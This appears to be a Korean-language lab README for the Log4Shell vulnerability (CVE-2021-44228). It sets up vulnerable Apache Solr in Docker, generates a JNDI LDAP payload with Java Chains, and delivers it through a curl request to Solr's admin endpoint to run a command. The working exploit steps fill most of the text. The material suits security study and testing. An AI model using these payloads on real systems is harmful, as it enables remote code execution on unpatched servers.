# Apache Log4j2 JNDI 인젝션 취약점 (CVE-2021-44228)

Apache Log4j 2는 Log4j 1.x의 상위 버전으로, Logback에서 사용 가능한 많은 개선 사항을 제공하면서 Logback의 구조적 문제를 해결했습니다.

2021년 12월, Apache Log4j2에서 0-day 취약점이 발견되었습니다. Log4j의 JNDI 지원이 이름 해석을 제한하지 않았기 때문에 `rmi:` 및 `ldap:` 같은 프로토콜이 안전하지 않거나 원격 코드 실행을 허용할 수 있습니다.

## 취약점 환경 구성

### 1. Apache Solr 설치
```bash
docker compose up -d
```

서버가 시작된 후, `http://localhost:8983`에서 Apache Solr 관리자 포털에 접속할 수 있습니다.

### 2. Java Chains 설치 및 구성

Java Chains는 JNDI 페이로드를 생성하고 실행하는 도구입니다. 다음 단계로 설치합니다:

1. Java Chains 도커 이미지 실행:
```bash
docker run -d --name java-chains --network cve-2021-44228_default -p 8011:8011 javachains/javachains:latest
```

2. Java Chains 웹 인터페이스 접속:
- 브라우저에서 `http://localhost:8011` 접속
- 초기 비밀번호는 도커 로그에서 확인: `docker logs java-chains`

3. JNDI 페이로드 생성:
- JNDI Basic Payload 선택
- Command 입력란에 실행할 명령어 입력 (예: `touch /tmp/success`)
- "Generate" 버튼 클릭하여 LDAP URL 생성

## 취약점 공격

1. 생성된 LDAP URL을 사용하여 Solr에 페이로드 전송:
```bash
curl "http://localhost:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A50389%2F[생성된_ID]%7D"
```

2. 명령어 실행 확인:
```bash
docker exec -it cve-2021-44228-solr-1 bash
ls -l /tmp/success
```

## 주의사항

1. Java Chains와 Solr 컨테이너가 같은 Docker 네트워크에 있어야 합니다.
2. JDK 버전이 8u191 미만인 경우에만 `rmi://` 또는 `ldap://` 프로토콜을 사용할 수 있습니다.
3. 취약점 공격 시 반드시 테스트 환경에서만 실행해야 합니다.

## 참고 자료

- https://logging.apache.org/log4j/2.x/security.html
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://xz.aliyun.com/t/10649 